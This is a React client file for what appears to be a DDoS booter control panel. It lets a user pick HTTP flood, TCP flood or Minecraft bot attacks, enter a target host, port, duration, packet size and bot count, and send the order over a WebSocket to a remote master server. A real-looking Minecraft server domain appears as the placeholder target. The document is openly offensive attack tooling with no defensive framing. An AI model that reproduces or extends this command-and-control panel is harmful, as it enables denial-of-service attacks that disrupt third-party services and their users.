"use client";
import {use, useEffect, useRef, useState} from "react";
import {InputText} from "primereact/inputtext";
import {Dropdown} from "primereact/dropdown";

export default function Home() {
  const [messages, setMessages] = useState<string[]>([]);
  const wsRef = useRef<WebSocket>(null);
  const [closing, setClosing] = useState("closing");
  const [payload, setPayload] = useState({
    attackType: "http-flood",
    host: "",
    port: "",
    amount: "",
    packetSize: "",
    time: ""
  });
  const [buttonDisable, setButtonDisable] = useState(false);
  const [attackTypes, setAttackTypes] = useState([
    {value: "http-flood", label: "HTTP Flood"},
    {value: "tcp-flood", label: "TCP Flood"},
    {value: "mc-bots", label: "Minecraft Bots"}
  ]);
  const [selectedAttack, setSelectedAttack] = useState("http-flood");

  function connectWs(){
    const ws = new WebSocket("wss://ws.gcloud.com.gt/api/ws/master");
    wsRef.current = ws;
    ws.onopen = () =>{
      setClosing("");
      console.log("websocket conectado");

      ws.onmessage = (e) =>{
        setMessages(prev => [...prev, e.data]);
      }

      ws.onerror = (err)=>{
        console.error(err);
      }

      ws.onclose = () =>{
        setClosing("closing");
      }
    }
  }
  useEffect(() => {
    if(closing === "closing"){
      connectWs();
    }
  }, [closing]);
  async function handleSubmit () {
    console.log(wsRef.current?.readyState)
    setMessages([]);
    const formatted = {
      attackType: payload.attackType,
      host: payload.host,
      port: Number(payload.port),
      amount: Number(payload.amount),
      packetSize: Number(payload.packetSize),
      time: Number(payload.time)
    }
    wsRef.current?.send(JSON.stringify(formatted));
  }
  return (
    <div className="min-h-screen bg-black p-4">
      <div className="max-w-6xl mx-auto">
        <div className="mb-4 flex items-center justify-between">
          <div className="flex items-center gap-2">

          </div>

        </div>
      <div>
      <div className="flex">
       <div className={"flex-col m-4"}>
         <p>Attack type</p>
         <Dropdown options={attackTypes}
                   value={selectedAttack}
                   placeholder={"Select an attack type"}
                   optionValue="value"
                   optionLabel="label"
                   onChange={(e) => {
                     console.log(e.target.value)
                     setSelectedAttack(e.target.value);
                     setPayload(prev => ({...prev, attackType: e.target.value}));
                   }}
         />
       </div>

       <div className="flex-col m-4">
         <p>host</p>
         <InputText placeholder={`${selectedAttack === "http-flood" ? "https://dracolegend.net" : "dracolegend.net"}`}
          onChange={(e)=> setPayload(prev => ({...prev, host: e.target.value}))
          }
         />
       </div>
          
        { (selectedAttack === "tcp-flood" || selectedAttack === "mc-bots") && (

            <div className="flex-col m-4">
              <p>
                port
              </p>
              <InputText placeholder={`25565`}
               onChange={(e)=> setPayload(prev => ({...prev, port: e.target.value}))
               }
              />
            </div>

        )}

        { (selectedAttack === "tcp-flood" || selectedAttack === "http-flood") ? (
            <>
            <div className="flex-col m-4">

            <p>
                time (seconds)
              </p>
              <InputText placeholder={`60`}
                         onChange={(e)=> setPayload(prev => ({...prev, time: e.target.value}))}
              />
            </div>
            <div className="flex-col m-4">

              <p>
                packet size (kb)
              </p>
              <InputText placeholder={"64"}
                         onChange={(e)=> setPayload(prev => ({...prev, packetSize: e.target.value}))}
              />

            </div>
            </>
        ) : (
            <>
            <div className="flex-col m-4">

            <p>
                Amount
              </p>
              <InputText placeholder={`5`}
                         onChange={(e)=> setPayload(prev => ({...prev, amount: e.target.value}))}
              />
            </div>
            </>
        )}
        <div className={"m-4"}>
          <button onClick={handleSubmit} className="bg-purple-500 rounded-lg p-4 font-bold"> Start attack </button>
        </div>

      </div>
      </div>
        <div
            className="bg-gray-900 rounded-lg p-4 font-mono text-sm text-green-400
             h-[calc(80vh-8rem)] overflow-y-auto
             border border-green-800 shadow-lg shadow-green-900/50
             flex flex-col-reverse"
        >
          {messages.length === 0 ? (
              <div className="text-gray-500">Waiting for messages...</div>
          ) : (
              messages.map((msg, index) => (
                  <div key={index} className="mb-1 whitespace-pre-wrap">
                    <span className="text-gray-500">&gt;</span> {msg}
                  </div>
              ))
          )}
        </div>

      </div>
    </div>
  );
}
